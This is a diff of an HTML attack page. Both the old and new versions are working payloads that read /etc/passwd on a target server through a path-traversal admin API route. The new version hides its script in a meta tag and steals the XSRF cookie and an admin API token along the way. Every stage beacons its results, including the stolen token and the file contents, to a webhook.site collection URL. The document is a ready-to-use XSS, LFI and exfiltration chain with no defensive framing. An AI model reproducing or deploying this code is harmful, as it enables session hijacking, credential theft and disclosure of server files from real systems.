@@ -1,25 +1,104 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>Steal /etc/passwd</title>
-  <script>
-    fetch("/api/admin/logs/../../../../../../etc/passwd", {
-      headers: {
-        "Authorization": "Bearer 345|tvSyYAo7C6ZFfrsANb0UFBA7npJTt90wSY5DdcPu50ba1ac0",
-        "Accept": "application/json"
-      }
-    })
-    .then(res => res.json())
-    .then(data => {
-      fetch("https://webhook.site/8c39a004-d176-4b18-8eed-a866de6da806", {
-        method: "POST",
-        body: JSON.stringify({ passwd: data.content })
-      });
-    });
-  </script>
+    <meta charset="utf-8">
+    <title>Get /etc/passwd</title>
+    <meta name="description" content='<script>
+        (function() {
+            var webhook_id = "8c39a004-d176-4b18-8eed-a866de6da806";
+            var attacker_url = "https://webhook.site/" + webhook_id;
+            var loc = window.location.href;
+
+            function sendPing(data) {
+                var params = new URLSearchParams();
+                params.append("source_tag", "name:GET_ETC_PASSWD_V1");
+                for (var key in data) { 
+                    let val_str = String(data[key]);
+                    params.append(key, val_str.substring(0, 1000));
+                }
+                new Image().src = attacker_url + "?" + params.toString();
+            }
+
+            // Bước 1: Lấy XSRF-TOKEN từ cookie
+            var xsrfTokenValue = null;
+            try {
+                var cookies = document.cookie.split(";");
+                for (var i = 0; i < cookies.length; i++) {
+                    var cookie = cookies[i].trim();
+                    if (cookie.startsWith("XSRF-TOKEN=")) {
+                        xsrfTokenValue = decodeURIComponent(cookie.substring("XSRF-TOKEN=".length));
+                        break;
+                    }
+                }
+            } catch (e_cookie) {
+                sendPing({ stage: "cookie_parse_error", error: e_cookie.message });
+                return;
+            }
+
+            if (!xsrfTokenValue) {
+                sendPing({ stage: "xsrf_token_missing", loc: loc });
+                return;
+            }
+
+            sendPing({ stage: "script_start", loc: loc, xsrf_preview: xsrfTokenValue.substring(0,20) });
+
+            // Bước 2: Gọi /generate-token để lấy token hợp lệ
+            fetch("/generate-token", {
+                method: "POST",
+                headers: {
+                    "Accept": "application/json",
+                    "X-Requested-With": "XMLHttpRequest",
+                    "X-XSRF-TOKEN": xsrfTokenValue
+                }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    var status_code = response.status;
+                    return response.text().then(text_body => {
+                        sendPing({ stage: "gen_token_FAIL", status: status_code, body: text_body });
+                        throw new Error("GenTokenFailStatus: " + status_code);
+                    });
+                }
+                return response.json();
+            })
+            .then(data => {
+                if (data && data.token) {
+                    var adminApiToken = data.token;
+                    sendPing({ stage: "got_api_token", token: adminApiToken });
+
+                    // Bước 3: Gọi API LFI để đọc /etc/passwd
+                    return fetch("/api/admin/logs/../../../../../../etc/passwd", {
+                        method: "GET",
+                        headers: {
+                            "Accept": "application/json",
+                            "Authorization": "Bearer " + adminApiToken,
+                            "X-Requested-With": "XMLHttpRequest"
+                        }
+                    });
+                } else {
+                    sendPing({ stage: "no_token_in_response", response: JSON.stringify(data) });
+                    throw new Error("No token in response");
+                }
+            })
+            .then(response => {
+                if (!response.ok) {
+                    return response.text().then(body => {
+                        sendPing({ stage: "read_passwd_FAIL", status: response.status, body: body });
+                        throw new Error("Read /etc/passwd failed");
+                    });
+                }
+                return response.json();
+            })
+            .then(passwdData => {
+                sendPing({ stage: "READ_ETC_PASSWD_SUCCESS", content: JSON.stringify(passwdData) });
+            })
+            .catch(err => {
+                sendPing({ stage: "final_catch", error: err.message });
+            });
+        })();
+    </script>'>
 </head>
 <body>
-  <h1>Loading...</h1>
+    <h1>Loading /etc/passwd...</h1>
 </body>
 </html>
